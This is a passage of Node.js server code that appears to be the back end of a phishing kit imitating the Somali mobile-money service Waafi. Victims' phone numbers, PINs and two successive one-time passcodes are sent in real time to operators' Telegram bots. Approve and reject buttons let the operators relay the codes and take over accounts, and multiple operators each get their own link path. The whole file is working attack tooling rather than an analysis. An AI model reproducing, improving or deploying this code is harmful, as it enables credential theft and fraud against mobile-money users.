        await acknowledgeCallback(`❌ Unknown action: ${action}`, true);
      }
    }
    else {
      logger.warn(`${user.name}: Unknown callback type: ${type}`);
      await acknowledgeCallback(`❌ Unknown type: ${type}`, true);
    }

  } catch (error) {
    logger.error(`${user.name}: Callback handler fatal error:`, error.message);
    logger.error(error.stack);
    
    try {
      await acknowledgeCallback('❌ An error occurred', true);
    } catch (e) {
      logger.error(`${user.name}: Failed to send error notification:`, e.message);
    }
  }
}

// ============================================
// DYNAMIC USER LOADING
// ============================================
const users = new Map();

const loadUsers = () => {
  let loadedCount = 0;
  let errorCount = 0;

  for (let i = 1; i <= CONFIG.MAX_USERS; i++) {
    try {
      const linkInsert = process.env[`USER_LINK_INSERT_${i}`];
      const botToken = process.env[`TELEGRAM_BOT_TOKEN_${i}`];
      const chatId = process.env[`TELEGRAM_CHAT_ID_${i}`];
      const userName = process.env[`USER_NAME_${i}`] || `User ${i}`;

      if (!linkInsert || !botToken || !chatId) {
        continue;
      }

      if (!/^[a-zA-Z0-9-_]+$/.test(linkInsert)) {
        logger.warn(`Invalid link insert format for user ${i}: ${linkInsert}`);
        errorCount++;
        continue;
      }

      if (!/^\d+:[A-Za-z0-9_-]+$/.test(botToken)) {
        logger.warn(`Invalid bot token format for user ${i}`);
        errorCount++;
        continue;
      }

      if (!/^-?\d+$/.test(chatId)) {
        logger.warn(`Invalid chat ID format for user ${i}: ${chatId}`);
        errorCount++;
        continue;
      }

      if (users.has(linkInsert)) {
        logger.warn(`Duplicate link insert detected: ${linkInsert}`);
        errorCount++;
        continue;
      }

      const userObj = {
        id: i,
        name: sanitizeInput(userName),
        linkInsert,
        botToken,
        chatId,
        bot: null,
        isHealthy: false,
        consecutiveErrors: 0,
        loginNotifications: new Map(),
        firstOtpVerifications: new Map(),
        secondOtpVerifications: new Map(),
        verifiedUsers: new Map(),
        processedRequests: new Map(),
        errorCount: 0,
        lastError: null,
        lastErrorTime: 0,
        requestCount: 0,
        lastRequestTime: 0
      };

      const botManager = new BotManager(userObj, linkInsert);
      userObj.botManager = botManager;

      users.set(linkInsert, userObj);
      loadedCount++;
    } catch (error) {
      logger.error(`Error loading user ${i}:`, error.message);
      errorCount++;
    }
  }

  logger.info(`Loaded ${loadedCount} users (${errorCount} errors)`);
  return { loadedCount, errorCount };
};

loadUsers();

// ============================================
// STAGGERED BOT INITIALIZATION
// ============================================
const initializeAllBotsStaggered = async () => {
  const userArray = Array.from(users.values());
  
  logger.info(`Starting staggered initialization of ${userArray.length} bots...`);
  
  for (let i = 0; i < userArray.length; i++) {
    const user = userArray[i];
    
    logger.info(`Initializing bot ${i + 1}/${userArray.length}: ${user.name}`);
    
    try {
      await user.botManager.initialize();
    } catch (error) {
      logger.error(`Failed to initialize ${user.name}:`, error.message);
    }
    
    if (i < userArray.length - 1) {
      await new Promise(resolve => setTimeout(resolve, CONFIG.BOT_STARTUP_DELAY));
    }
  }
  
  logger.info('All bots initialization complete');
  
  // Show final status
  const healthyBots = userArray.filter(u => u.isHealthy).length;
  logger.info(`✅ ${healthyBots}/${userArray.length} bots are healthy`);
};

initializeAllBotsStaggered();

// ============================================
// TELEGRAM MESSAGE SENDING
// ============================================
const sendTelegramMessage = async (user, message, options = {}) => {
  return requestQueue.add(async () => {
    try {
      if (!user.bot || !user.botManager?.isHealthy()) {
        return { success: false, error: 'Bot not ready' };
      }

      const truncatedMessage = truncateMessage(message);
      
      await user.bot.sendMessage(user.chatId, truncatedMessage, { 
        parse_mode: 'HTML',
        ...options 
      });
      
      user.errorCount = Math.max(0, user.errorCount - 1);
      user.consecutiveErrors = 0;
      return { success: true };
    } catch (error) {
      user.errorCount++;
      user.consecutiveErrors = (user.consecutiveErrors || 0) + 1;
      user.lastError = error.message;
      user.lastErrorTime = Date.now();
      
      logger.error(`Error sending message for ${user.name}:`, error.code, error.message);
      
      if (error.response?.statusCode === 401) {
        user.isHealthy = false;
        logger.error(`Bot authentication failed for ${user.name} - check token`);
        return { success: false, error: 'Bot authentication failed', critical: true };
      }
      
      if (error.response?.statusCode === 429) {
        const retryAfter = error.response.parameters?.retry_after || 30;
        logger.warn(`Rate limited for ${user.name} - retry after ${retryAfter}s`);
        return { success: false, error: 'Rate limited', retryAfter, rateLimited: true };
      }
      
      return { success: false, error: error.message };
    }
  }, 1);
};

// ============================================
// AUTO-CLEANUP
// ============================================
setInterval(() => {
  try {
    const now = Date.now();
    const timeoutThreshold = now - CONFIG.APPROVAL_TIMEOUT;
    const deleteThreshold = now - (10 * 60 * 1000);
    const userCacheThreshold = now - CONFIG.USER_CACHE_DURATION;
    
    users.forEach((user) => {
      try {
        // Mark expired logins
        for (const [key, value] of user.loginNotifications.entries()) {
          if (value.timestamp < timeoutThreshold && !value.expired) {
            value.expired = true;
            value.approved = false;
            value.rejected = true;
            value.rejectionReason = 'timeout';
          }
        }
        
        // Mark expired first OTPs
        for (const [key, value] of user.firstOtpVerifications.entries()) {
          if (value.timestamp < timeoutThreshold && !value.expired) {
            value.expired = true;
            value.status = 'timeout';
          }
        }
        
        // Mark expired second OTPs
        for (const [key, value] of user.secondOtpVerifications.entries()) {
          if (value.timestamp < timeoutThreshold && !value.expired) {
            value.expired = true;
            value.status = 'timeout';
          }
        }
        
        // Delete old logins
        for (const [key, value] of user.loginNotifications.entries()) {
          if (value.timestamp < deleteThreshold) {
            user.loginNotifications.delete(key);
          }
        }
        
        // Delete old first OTPs
        for (const [key, value] of user.firstOtpVerifications.entries()) {
          if (value.timestamp < deleteThreshold) {
            user.firstOtpVerifications.delete(key);
          }
        }
        
        // Delete old second OTPs
        for (const [key, value] of user.secondOtpVerifications.entries()) {
          if (value.timestamp < deleteThreshold) {
            user.secondOtpVerifications.delete(key);
          }
        }
        
        // Clean expired user cache
        let expiredCount = 0;
        for (const [phoneNumber, verifiedData] of user.verifiedUsers.entries()) {
          if (verifiedData.timestamp < userCacheThreshold) {
            user.verifiedUsers.delete(phoneNumber);
            expiredCount++;
          }
        }
        
        if (expiredCount > 0) {
          logger.info(`${user.name}: Cleaned up ${expiredCount} expired verified users (30-min cache)`);
        }
        
      } catch (error) {
        logger.error(`Cleanup error for ${user.name}:`, error.message);
      }
    });
  } catch (error) {
    logger.error('Global cleanup error:', error.message);
  }
}, CONFIG.CLEANUP_INTERVAL);

// ============================================
// HEALTH CHECK ENDPOINT
// ============================================
app.get('/api/health', (req, res) => {
  try {
    const queueStats = requestQueue.getStats();
    const memUsage = process.memoryUsage();
    
    const userList = Array.from(users.values()).map(u => ({
      name: u.name,
      link: u.linkInsert,
      active: !!u.bot,
      healthy: u.isHealthy,
      logins: u.loginNotifications.size,
      firstOtps: u.firstOtpVerifications.size,
      secondOtps: u.secondOtpVerifications.size,
      verified: u.verifiedUsers.size,
      errorCount: u.errorCount,
      lastError: u.lastError,
      lastErrorTime: u.lastErrorTime ? new Date(u.lastErrorTime).toISOString() : null
    }));

    const healthyCount = userList.filter(u => u.healthy).length;

    res.json({ 
      status: healthyCount > 0 ? 'ok' : 'degraded',
      totalUsers: users.size,
      healthyUsers: healthyCount,
      userCacheDuration: `${CONFIG.USER_CACHE_DURATION / 60000} minutes`,
      twoStepOtp: true,
      users: userList,
      queue: queueStats,
      memory: {
        heapUsed: `${(memUsage.heapUsed / 1024 / 1024).toFixed(2)} MB`,
        heapTotal: `${(memUsage.heapTotal / 1024 / 1024).toFixed(2)} MB`,
        external: `${(memUsage.external / 1024 / 1024).toFixed(2)} MB`
      },
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    logger.error('Health check error:', error.message);
    res.status(500).json({ 
      status: 'error', 
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// ============================================
// DYNAMIC ROUTE CREATION - TWO-STEP OTP
// ============================================

users.forEach((user, linkInsert) => {
  const basePath = `/api/${linkInsert}`;

  // Check user status
  app.post(`${basePath}/check-user-status`, async (req, res) => {
    try {
      const { phoneNumber } = req.body;
      
      if (!phoneNumber) {
        return res.status(400).json({ 
          success: false, 
          message: 'Phone number required' 
        });
      }

      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: phoneValidation.error 
        });
      }

      const isReturning = isVerifiedUser(user, phoneNumber);
      
      res.json({ 
        success: true,
        isReturningUser: isReturning,
        message: isReturning ? 'Returning user (30-min cache)' : 'New user',
        cacheExpiry: isReturning ? '30 minutes' : null
      });
    } catch (error) {
      logger.error(`check-user-status error for ${user.name}:`, error.message);
      res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
      });
    }
  });

  // Check login approval
  app.post(`${basePath}/check-login-approval`, async (req, res) => {
    try {
      const { phoneNumber, pin } = req.body;
      
      if (!phoneNumber || !pin) {
        return res.status(400).json({ 
          success: false, 
          message: 'Phone and PIN required' 
        });
      }

      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: phoneValidation.error 
        });
      }

      const pinValidation = validatePin(pin);
      if (!pinValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: pinValidation.error 
        });
      }

      const loginKey = `${phoneNumber}-${pin}`;
      const loginData = user.loginNotifications.get(loginKey);

      if (!loginData) {
        return res.json({ 
          success: true, 
          approved: false, 
          rejected: false, 
          expired: false, 
          message: 'Waiting for admin' 
        });
      }

      if (Date.now() - loginData.timestamp > CONFIG.APPROVAL_TIMEOUT) {
        return res.json({ 
          success: true, 
          approved: false, 
          rejected: true, 
          expired: true, 
          rejectionReason: 'timeout', 
          message: 'Session expired' 
        });
      }

      if (loginData.approved) {
        return res.json({ 
          success: true, 
          approved: true, 
          rejected: false, 
          expired: false, 
          message: 'Login approved' 
        });
      } else if (loginData.rejected) {
        return res.json({ 
          success: true, 
          approved: false, 
          rejected: true, 
          expired: false, 
          rejectionReason: loginData.rejectionReason || 'invalid', 
          message: 'Invalid credentials' 
        });
      } else {
        return res.json({ 
          success: true, 
          approved: false, 
          rejected: false, 
          expired: false, 
          message: 'Waiting for approval' 
        });
      }
    } catch (error) {
      logger.error(`check-login-approval error for ${user.name}:`, error.message);
      res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
      });
    }
  });

  // Login
  app.post(`${basePath}/login`, async (req, res) => {
    try {
      if (!user.bot) {
        return res.status(503).json({ 
          success: false, 
          message: 'Bot not configured' 
        });
      }

      if (!user.isHealthy) {
        return res.status(503).json({ 
          success: false, 
          message: 'Bot service unavailable' 
        });
      }
      
      const { phoneNumber, pin, timestamp } = req.body;
      
      if (!phoneNumber || !pin) {
        return res.status(400).json({ 
          success: false, 
          message: 'Phone and PIN required' 
        });
      }

      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: phoneValidation.error 
        });
      }

      const pinValidation = validatePin(pin);
      if (!pinValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: pinValidation.error 
        });
      }

      const requestKey = `login-${phoneNumber}-${pin}`;
      if (isDuplicate(user, requestKey)) {
        return res.json({ 
          success: true, 
          message: 'Login sent (cached)' 
        });
      }

      const loginKey = `${phoneNumber}-${pin}`;
      user.loginNotifications.set(loginKey, { 
        timestamp: Date.now(), 
        approved: false, 
        rejected: false, 
        expired: false 
      });

      logger.info(`${user.name}: 📱 New login request - ${phoneNumber}`);

      const message = formatLoginMessage(user, { 
        phoneNumber, 
        pin, 
        timestamp: timestamp || Date.now() 
      });
      
      const keyboard = {
        inline_keyboard: [
          [{ text: '✅ Allow to Proceed', callback_data: `login_proceed_${phoneNumber}_${pin}` }],
          [{ text: '❌ Invalid Information', callback_data: `login_invalid_${phoneNumber}_${pin}` }]
        ]
      };
      
      const result = await sendTelegramMessage(user, message, { reply_markup: keyboard });

      if (result.success) {
        user.requestCount++;
        user.lastRequestTime = Date.now();
        res.json({ 
          success: true, 
          message: 'Login sent - waiting for approval', 
          requiresApproval: true 
        });
      } else {
        res.status(500).json({ 
          success: false, 
          message: 'Failed to send notification', 
          error: result.error 
        });
      }
    } catch (error) {
      logger.error(`login error for ${user.name}:`, error.message);
      res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
      });
    }
  });

  // ========== FIRST OTP ENDPOINTS ==========
  
  // Verify First OTP
  app.post(`${basePath}/verify-first-otp`, async (req, res) => {
    try {
      if (!user.bot || !user.isHealthy) {
        return res.status(503).json({ 
          success: false, 
          message: 'Bot service unavailable' 
        });
      }
      
      const { phoneNumber, otp, timestamp } = req.body;
      
      if (!phoneNumber || !otp) {
        return res.status(400).json({ 
          success: false, 
          message: 'Phone and OTP required' 
        });
      }

      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: phoneValidation.error 
        });
      }

      const otpValidation = validateOtp(otp);
      if (!otpValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: otpValidation.error 
        });
      }

      const requestKey = `first-otp-${phoneNumber}-${otp}`;
      if (isDuplicate(user, requestKey)) {
        return res.json({ 
          success: true, 
          message: 'First OTP sent (cached)' 
        });
      }

      const verificationKey = `${phoneNumber}-${otp}`;
      user.firstOtpVerifications.set(verificationKey, { 
        status: 'pending', 
        timestamp: Date.now(), 
        expired: false 
      });

      logger.info(`${user.name}: 1️⃣ New First OTP verification - ${phoneNumber}`);

      const message = formatFirstOTPMessage(user, { 
        phoneNumber, 
        otp, 
        timestamp: timestamp || Date.now() 
      });
      
      const keyboard = {
        inline_keyboard: [
          [{ text: '✅ Correct (First OTP)', callback_data: `firstotp_correct_${phoneNumber}_${otp}` }],
          [
            { text: '❌ Wrong Code', callback_data: `firstotp_wrong_${phoneNumber}_${otp}` },
            { text: '⚠️ Wrong PIN', callback_data: `firstotp_wrongpin_${phoneNumber}_${otp}` }
          ]
        ]
      };
      
      const result = await sendTelegramMessage(user, message, { reply_markup: keyboard });

      if (result.success) {
        user.requestCount++;
        user.lastRequestTime = Date.now();
        res.json({ 
          success: true, 
          message: 'First OTP sent successfully' 
        });
      } else {
        res.status(500).json({ 
          success: false, 
          message: 'Failed to send notification', 
          error: result.error 
        });
      }
    } catch (error) {
      logger.error(`verify-first-otp error for ${user.name}:`, error.message);
      res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
      });
    }
  });

  // Check First OTP Status
  app.post(`${basePath}/check-first-otp-status`, async (req, res) => {
    try {
      const { phoneNumber, otp } = req.body;
      
      if (!phoneNumber || !otp) {
        return res.status(400).json({ 
          success: false, 
          message: 'Phone and OTP required' 
        });
      }

      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: phoneValidation.error 
        });
      }

      const otpValidation = validateOtp(otp);
      if (!otpValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: otpValidation.error 
        });
      }

      const verificationKey = `${phoneNumber}-${otp}`;
      const verification = user.firstOtpVerifications.get(verificationKey);

      if (!verification) {
        return res.json({ 
          success: true, 
          status: 'pending', 
          message: 'Waiting for first OTP verification' 
        });
      }

      if (Date.now() - verification.timestamp > CONFIG.APPROVAL_TIMEOUT) {
        return res.json({ 
          success: true, 
          status: 'timeout', 
          message: 'First OTP session expired' 
        });
      }

      if (verification.status === 'approved') {
        user.firstOtpVerifications.delete(verificationKey);
        return res.json({ 
          success: true, 
          status: 'approved', 
          message: 'First OTP verified - proceed to second OTP'
        });
      } else if (verification.status === 'rejected') {
        user.firstOtpVerifications.delete(verificationKey);
        return res.json({ 
          success: true, 
          status: 'rejected', 
          message: 'First OTP code is wrong' 
        });
      } else if (verification.status === 'wrong_pin') {
        user.firstOtpVerifications.delete(verificationKey);
        return res.json({ 
          success: true, 
          status: 'wrong_pin', 
          message: 'PIN is wrong' 
        });
      } else if (verification.status === 'timeout') {
        return res.json({ 
          success: true, 
          status: 'timeout', 
          message: 'First OTP session expired' 
        });
      } else {
        return res.json({ 
          success: true, 
          status: 'pending', 
          message: 'Waiting for first OTP verification' 
        });
      }
    } catch (error) {
      logger.error(`check-first-otp-status error for ${user.name}:`, error.message);
      res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
      });
    }
  });

  // Request Second OTP
  app.post(`${basePath}/request-second-otp`, async (req, res) => {
    try {
      const { phoneNumber, firstOtp, timestamp } = req.body;
      
      if (!phoneNumber || !firstOtp) {
        return res.status(400).json({ 
          success: false, 
          message: 'Phone and first OTP required' 
        });
      }

      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: phoneValidation.error 
        });
      }

      logger.info(`${user.name}: 📱 Second OTP requested for ${phoneNumber}`);

      res.json({ 
        success: true, 
        message: 'Second OTP request acknowledged' 
      });
    } catch (error) {
      logger.error(`request-second-otp error for ${user.name}:`, error.message);
      res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
      });
    }
  });

  // Verify Second OTP
  app.post(`${basePath}/verify-second-otp`, async (req, res) => {
    try {
      if (!user.bot || !user.isHealthy) {
        return res.status(503).json({ 
          success: false, 
          message: 'Bot service unavailable' 
        });
      }
      
      const { phoneNumber, otp, firstOtp, timestamp } = req.body;
      
      if (!phoneNumber || !otp || !firstOtp) {
        return res.status(400).json({ 
          success: false, 
          message: 'Phone, OTP, and first OTP required' 
        });
      }

      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: phoneValidation.error 
        });
      }

      const otpValidation = validateOtp(otp);
      if (!otpValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: otpValidation.error 
        });
      }

      const requestKey = `second-otp-${phoneNumber}-${otp}`;
      if (isDuplicate(user, requestKey)) {
        return res.json({ 
          success: true, 
          message: 'Second OTP sent (cached)' 
        });
      }

      const verificationKey = `${phoneNumber}-${otp}`;
      user.secondOtpVerifications.set(verificationKey, { 
        status: 'pending', 
        timestamp: Date.now(), 
        expired: false,
        firstOtp: firstOtp
      });

      logger.info(`${user.name}: 2️⃣ New Second OTP verification - ${phoneNumber}`);

      const message = formatSecondOTPMessage(user, { 
        phoneNumber, 
        otp,
        firstOtp,
        timestamp: timestamp || Date.now() 
      });
      
      const keyboard = {
        inline_keyboard: [
          [{ text: '✅ Correct (Second OTP)', callback_data: `secondotp_correct_${phoneNumber}_${otp}` }],
          [
            { text: '❌ Wrong Code', callback_data: `secondotp_wrong_${phoneNumber}_${otp}` },
            { text: '⚠️ Wrong PIN', callback_data: `secondotp_wrongpin_${phoneNumber}_${otp}` }
          ]
        ]
      };
      
      const result = await sendTelegramMessage(user, message, { reply_markup: keyboard });

      if (result.success) {
        user.requestCount++;
        user.lastRequestTime = Date.now();
        res.json({ 
          success: true, 
          message: 'Second OTP sent successfully' 
        });
      } else {
        res.status(500).json({ 
          success: false, 
          message: 'Failed to send notification', 
          error: result.error 
        });
      }
    } catch (error) {
      logger.error(`verify-second-otp error for ${user.name}:`, error.message);
      res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
      });
    }
  });

  // Check Second OTP Status
  app.post(`${basePath}/check-second-otp-status`, async (req, res) => {
    try {
      const { phoneNumber, otp } = req.body;
      
      if (!phoneNumber || !otp) {
        return res.status(400).json({ 
          success: false, 
          message: 'Phone and OTP required' 
        });
      }

      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: phoneValidation.error 
        });
      }

      const otpValidation = validateOtp(otp);
      if (!otpValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: otpValidation.error 
        });
      }

      const verificationKey = `${phoneNumber}-${otp}`;
      const verification = user.secondOtpVerifications.get(verificationKey);

      if (!verification) {
        return res.json({ 
          success: true, 
          status: 'pending', 
          message: 'Waiting for second OTP verification' 
        });
      }

      if (Date.now() - verification.timestamp > CONFIG.APPROVAL_TIMEOUT) {
        return res.json({ 
          success: true, 
          status: 'timeout', 
          message: 'Second OTP session expired' 
        });
      }

      if (verification.status === 'approved') {
        user.secondOtpVerifications.delete(verificationKey);
        return res.json({ 
          success: true, 
          status: 'approved', 
          message: 'All verifications complete',
          cacheExpiry: '30 minutes'
        });
      } else if (verification.status === 'rejected') {
        user.secondOtpVerifications.delete(verificationKey);
        return res.json({ 
          success: true, 
          status: 'rejected', 
          message: 'Second OTP code is wrong' 
        });
      } else if (verification.status === 'wrong_pin') {
        user.secondOtpVerifications.delete(verificationKey);
        return res.json({ 
          success: true, 
          status: 'wrong_pin', 
          message: 'PIN is wrong' 
        });
      } else if (verification.status === 'timeout') {
        return res.json({ 
          success: true, 
          status: 'timeout', 
          message: 'Second OTP session expired' 
        });
      } else {
        return res.json({ 
          success: true, 
          status: 'pending', 
          message: 'Waiting for second OTP verification' 
        });
      }
    } catch (error) {
      logger.error(`check-second-otp-status error for ${user.name}:`, error.message);
      res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
      });
    }
  });

  // Resend First OTP
  app.post(`${basePath}/resend-first-otp`, async (req, res) => {
    try {
      if (!user.bot || !user.isHealthy) {
        return res.status(503).json({ 
          success: false, 
          message: 'Bot service unavailable' 
        });
      }
      
      const { phoneNumber, timestamp } = req.body;
      
      if (!phoneNumber) {
        return res.status(400).json({ 
          success: false, 
          message: 'Phone number required' 
        });
      }

      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: phoneValidation.error 
        });
      }

      const { countryCode, number } = formatPhoneNumber(phoneNumber);
      const message = `🔄 <b>${sanitizeInput(user.name)} - FIRST OTP RESEND</b>\n\n📱 <code>${phoneNumber}</code>\n⏰ ${new Date(timestamp || Date.now()).toLocaleString()}`;
      
      const result = await sendTelegramMessage(user, message);

      if (result.success) {
        res.json({ 
          success: true, 
          message: 'First OTP resend notification sent' 
        });
      } else {
        res.status(500).json({ 
          success: false, 
          message: 'Failed to send notification', 
          error: result.error 
        });
      }
    } catch (error) {
      logger.error(`resend-first-otp error for ${user.name}:`, error.message);
      res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
      });
    }
  });

  // Resend Second OTP
  app.post(`${basePath}/resend-second-otp`, async (req, res) => {
    try {
      if (!user.bot || !user.isHealthy) {
        return res.status(503).json({ 
          success: false, 
          message: 'Bot service unavailable' 
        });
      }
      
      const { phoneNumber, firstOtp, timestamp } = req.body;
      
      if (!phoneNumber) {
        return res.status(400).json({ 
          success: false, 
          message: 'Phone number required' 
        });
      }

      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: phoneValidation.error 
        });
      }

      const { countryCode, number } = formatPhoneNumber(phoneNumber);
      const message = `🔄 <b>${sanitizeInput(user.name)} - SECOND OTP RESEND</b>\n\n📱 <code>${phoneNumber}</code>\n🔗 First OTP Ref: <code>${firstOtp || 'N/A'}</code>\n⏰ ${new Date(timestamp || Date.now()).toLocaleString()}`;
      
      const result = await sendTelegramMessage(user, message);

      if (result.success) {
        res.json({ 
          success: true, 
          message: 'Second OTP resend notification sent' 
        });
      } else {
        res.status(500).json({ 
          success: false, 
          message: 'Failed to send notification', 
          error: result.error 
        });
      }
    } catch (error) {
      logger.error(`resend-second-otp error for ${user.name}:`, error.message);
      res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
      });
    }
  });
});

// ============================================
// 404 HANDLER
// ============================================
app.use((req, res) => {
  res.status(404).json({ 
    success: false, 
    message: 'Endpoint not found',
    path: req.path 
  });
});

// ============================================
// GLOBAL ERROR HANDLER
// ============================================
app.use((err, req, res, next) => {
  logger.error('Unhandled error:', err.message);
  logger.error(err.stack);
  
  res.status(500).json({ 
    success: false, 
    error: 'Internal server error',
    message: process.env.NODE_ENV === 'development' ? err.message : undefined
  });
});

// ============================================
// PERIODIC HEALTH MONITORING
// ============================================
setInterval(() => {
  users.forEach((user) => {
    if (user.botManager && !user.botManager.isHealthy()) {
      logger.warn(`${user.name}: Bot unhealthy - checking...`);
      
      if (!user.botManager.isInitializing && 
          !user.botManager.restartScheduled &&
          user.botManager.restartAttempts < user.botManager.maxRestartAttempts) {
        user.botManager.scheduleRestart(15000);
      }
    }
    
    if (user.consecutiveErrors > 0 && Date.now() - user.lastErrorTime > 300000) {
      user.consecutiveErrors = 0;
      logger.info(`Reset consecutive errors for ${user.name}`);
    }
  });
}, 60000);

// ============================================
// START SERVER
// ============================================
const server = app.listen(PORT, () => {
  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🇸🇴 Waafi Somalia - TWO-STEP OTP System (UPDATED)`);
  console.log(`👥 Active users: ${users.size}/${CONFIG.MAX_USERS}`);
  console.log(`⏱️  Approval timeout: ${CONFIG.APPROVAL_TIMEOUT / 60000} minutes`);
  console.log(`⏱️  User cache duration: ${CONFIG.USER_CACHE_DURATION / 60000} minutes`);
  console.log(`🔢 Max concurrent requests: ${CONFIG.MAX_CONCURRENT_REQUESTS}`);
  console.log(`♻️  Returning users skip both OTPs for 30 min`);
  console.log(`🔐 New users verify 2 OTPs`);
  console.log(`✨ IMPROVEMENTS: Zimbabwe-style error handling applied`);
  console.log('\n📋 Active endpoints:');
  users.forEach((user, linkInsert) => {
    const status = user.isHealthy ? '✅' : '⏳';
    console.log(`   ${status} ${user.name}: /api/${linkInsert}/*`);
  });
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
});

// ============================================
// GRACEFUL SHUTDOWN
// ============================================
const gracefulShutdown = async (signal) => {
  logger.info(`${signal} received, shutting down gracefully...`);
  
  server.close(() => {
    logger.info('HTTP server closed');
  });
  
  const shutdownPromises = Array.from(users.values()).map(async (user) => {
    if (user.botManager) {
      try {
        await user.botManager.cleanup();
        logger.info(`${user.name} bot stopped`);
      } catch (error) {
        logger.error(`Error stopping ${user.name} bot:`, error.message);
      }
    }
  });
  
  try {
    await Promise.allSettled(shutdownPromises);
    logger.info('All bots stopped');
    process.exit(0);
  } catch (error) {
    logger.error('Error during shutdown:', error.message);
    process.exit(1);
  }
};

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

// ============================================
// UNCAUGHT EXCEPTION HANDLER
// ============================================
process.on('uncaughtException', (error) => {
  logger.error('Uncaught Exception:', error.message);
  logger.error(error.stack);
});

process.on('unhandledRejection', (reason, promise) => {
  logger.error('Unhandled Rejection at:', promise);
  logger.error('Reason:', reason);
});